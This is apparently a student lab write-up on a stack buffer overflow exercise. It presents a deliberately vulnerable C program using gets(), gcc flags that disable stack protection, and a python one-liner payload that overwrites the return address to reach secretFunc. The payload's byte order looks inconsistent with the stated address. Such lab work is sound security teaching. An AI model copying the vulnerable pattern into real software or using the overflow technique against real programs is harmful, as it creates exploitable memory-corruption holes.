# I. Buffer overflow attack

> Conduct on bof1.c, bof2.c, bof3.c programs.

## 1. Conduct on bof1.c program

```c
#include<stdio.h>
#include<unistd.h>
void secretFunc(){
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        printf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```

> ***Target***: call the function `secretFunc()` to print `Congratulation`.
> ***Method***: pass in a large amount of data to overflow the return address on the stack, then convert it to the address of the function `secretFunc()`.

### Compile source code with `gcc` (without protections):

```bash
gcc -g -m32 bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2
```

![image-20240924164647587](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20240924164647587.png)

Thus, the executable file bof1.out has been created and is ready for debugging. However, there is a warning that the `gets(array)` function is unsafe.

> `gets()` is a very old function to collect user input data, but it does not control the length of the data, so it is very easy to buffer overflow.

### Determine the address of `secretFunc()`:

Using `objdump` to find the address:

```bash
objdump -d bof1.out | grep secretFunc
```

![image-20240924165724104](C:\Users\User\AppData\Roaming\Typora\typora-user-images\image-20240924165724104.png)

So we know the address of `secretFunc()` is `0x0000bd11`

Load the program into `gdb`:

```bash
gdb bof1.out
```

```
echo $(python3 -c "print('a' * 208 + '\xbd\x11\x00\x00')") | ./bof1.out
```
